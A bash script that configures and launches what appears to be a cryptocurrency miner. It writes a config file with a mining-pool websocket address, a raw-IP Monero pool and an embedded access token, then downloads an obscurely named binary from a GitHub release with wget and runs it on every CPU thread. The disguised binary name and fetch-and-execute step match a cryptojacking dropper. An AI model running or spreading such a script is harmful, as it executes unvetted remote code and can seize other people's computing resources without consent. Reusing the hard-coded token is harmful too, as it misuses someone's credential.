#!/bin/bash

# === 1. Generate worker name based on a random date and time + "_SVP15"
generate_worker_name() {
    # Generate a random datetime within a range (e.g., last 10 years)
    start_date="2015-01-01"
    end_date=$(date +%Y-%m-%d)
    
    # Convert dates to Unix timestamps
    start_seconds=$(date -d "$start_date" +%s)
    end_seconds=$(date -d "$end_date" +%s)

    # Generate a random date
    random_seconds=$((RANDOM % (end_seconds - start_seconds) + start_seconds))
    random_datetime=$(date -d @$random_seconds "+%Y%m%d_%H%M%S")

    # Return the worker name with "_SVP15" appended
    echo "${random_datetime}_SVP15"
}

worker_name=$(generate_worker_name)
echo "[+] Generated worker name: $worker_name"

# === 2. Get total CPU threads using `nproc`
cpu_threads=$(nproc)
echo "[+] Detected CPU Threads: $cpu_threads"

# === 3. Create JSON config ===
config_file="appsettings.json"
cat <<EOF > $config_file
{
    "ClientSettings": {
        "poolAddress": "wss://solojetski.xyz/ws/LKLDRPOVVADJVARAUIEILBXYZICCGKKAYOMDLAGQYCFOZNVEYWJOGPZBETWH",
        "alias": "$worker_name",
        "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6IjdiMjkxY2Y5LTFiOGItNGYxZi05YWQxLTVkZGRlZmMwNDlhMyIsIk1pbmluZyI6IiIsIm5iZiI6MTc1NTcxMTI3OSwiZXhwIjoxNzg3MjQ3Mjc5LCJpYXQiOjE3NTU3MTEyNzksImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.mH99lwiIQw9EjTBgVlvE-9JsxERjmlPjbJBqYg4b1Ipw1pW8ehxX4O8EOg_MoL76NRRQIn2bdaWKeVINw6gzBrLIG8PM0r8Gcdr6c4iaXp-N4JqFQGI5Q95Nsh-gMdDq_MK0GW0jXdOx7dnSHJqGfDFlBQ6x58JLtL4TLNwS5v2ZNNfrGlgokB0pUt0j1jm7tFgvURCsa9IbL4mdDdryJT288iprJ0I2S22vP62bsRx9_dg6g5ZtM50Xt7nifSjnBCYRRwBdZf5xiKRbVVVr-ZeGBIbw8SUawbYLzOTxl-ICq4M345itbwyzgY7ti077DfSafUvQY6D8b0oJZF4h1w",
        "pps": true,
        "trainer": {
            "cpu": true,
            "gpu": false,
            "cpuThreads": $cpu_threads
        },
        "xmrSettings": {
            "disable": false,
            "enableGpu": false,
            "poolAddress": "45.33.15.247:8081",
            "customParameters": "-t $cpu_threads"
        }
    }
}
EOF
echo "[+] Created $config_file"

# === 4. Download travsivp binary ===
travsivp_url="https://github.com/vedhagsvp/jtqlpoa/releases/download/jtreas/travsivp"
travsivp_filename="travsivp"

if [ ! -f "$travsivp_filename" ]; then
    echo "[+] Downloading travsivp..."
    wget -q "$travsivp_url" -O "$travsivp_filename"
    echo "[+] Download complete."
else
    echo "[!] travsivp already exists. Skipping download."
fi

# === 5. Make executables
chmod +x "$travsivp_filename"
chmod +x "$config_file"
echo "[+] Set executable permissions."

# === 6. Run travsivp binary
echo "[+] Running ./$travsivp_filename ..."
./$travsivp_filename
